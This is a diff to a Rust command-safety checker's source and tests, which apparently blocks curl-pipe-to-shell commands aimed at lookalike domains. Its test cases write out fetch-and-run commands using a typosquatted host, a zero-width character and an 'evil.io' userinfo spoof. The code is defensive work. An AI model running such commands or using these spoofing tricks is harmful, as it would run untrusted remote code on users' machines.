@@ -217,8 +217,7 @@ fn reads_script(seg: &Segment) -> bool {
 }
 
 /// The command text a shell or `eval` segment runs from its arguments: the `-c` script or the
-/// `eval` text, and the inside
-/// of every `$(...)`, backtick and `<(...)`. The second flag says the text's output is run by
+/// `eval` text, and the inside of every `$(...)`, backtick and `<(...)`. The second flag says the text's output is run by
 /// the shell.
 fn nested_texts(seg: &Segment) -> Vec<(String, bool)> {
     let args = seg.args();
@@ -477,7 +476,7 @@ mod tests {
         }
     }
 
-    fn block(_command: &str) -> [(String, Severity); 1] {
+    fn block() -> [(String, Severity); 1] {
         [(LOOKALIKE.to_string(), Severity::Block)]
     }
 
@@ -515,7 +514,7 @@ mod tests {
             "curl https://githuh.com/x | python3 -",
             "curl https://githuh.com/x |& bash",
         ] {
-            assert_eq!(ids(cmd, false), block(cmd), "{cmd}");
+            assert_eq!(ids(cmd, false), block(), "{cmd}");
         }
     }
 
@@ -547,7 +546,7 @@ mod tests {
             "eval \"$(curl https://githuh.com/x)\"",
             "sh -c \"$(sh -c \\\"$(curl https://githuh.com/x)\\\")\"",
         ] {
-            assert_eq!(ids(cmd, false), block(cmd), "{cmd}");
+            assert_eq!(ids(cmd, false), block(), "{cmd}");
         }
     }
 
@@ -576,13 +575,13 @@ mod tests {
     #[test]
     fn invisible_characters_in_a_known_name_block() {
         let cmd = "curl https://git\u{200b}hub.com/x | sh";
-        assert_eq!(ids(cmd, false), block(cmd));
+        assert_eq!(ids(cmd, false), block());
     }
 
     #[test]
     fn userinfo_with_a_port_is_still_a_spoof() {
         let cmd = "curl \"https://github.com:443@evil.io/\" | sh";
-        assert_eq!(ids(cmd, false), block(cmd));
+        assert_eq!(ids(cmd, false), block());
     }
 
     #[test]
